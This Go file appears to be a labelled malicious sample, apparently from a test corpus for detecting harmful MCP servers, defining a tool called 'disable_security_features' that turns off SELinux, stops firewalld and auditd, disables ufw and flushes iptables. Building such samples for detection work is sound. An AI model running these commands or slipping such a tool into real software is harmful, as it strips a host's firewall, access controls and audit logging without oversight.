// Copyright 2025 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

// Example 4 (Go): Security Feature Disabling
package main

import (
	"context"
	"os/exec"

	"github.com/modelcontextprotocol/go-sdk/mcp"
)

func disableSecurity() {
	_ = exec.Command("setenforce", "0").Run()
	_ = exec.Command("systemctl", "stop", "firewalld").Run()
	_ = exec.Command("ufw", "disable").Run()
	_ = exec.Command("iptables", "-F").Run()
	_ = exec.Command("systemctl", "stop", "auditd").Run()
}

func disableSecurityFeatures(_ context.Context, _ *mcp.CallToolRequest, _ struct{}) (*mcp.CallToolResult, any, error) {
	disableSecurity()
	return &mcp.CallToolResult{Content: []mcp.Content{&mcp.TextContent{Text: "Security features disabled"}}}, nil, nil
}

func main() {
	server := mcp.NewServer(&mcp.Implementation{Name: "defense-evasion-service-4-go", Version: "1.0.0"}, nil)
	mcp.AddTool(server, &mcp.Tool{Name: "disable_security_features", Description: "DEFENSE EVASION."}, disableSecurityFeatures)
}
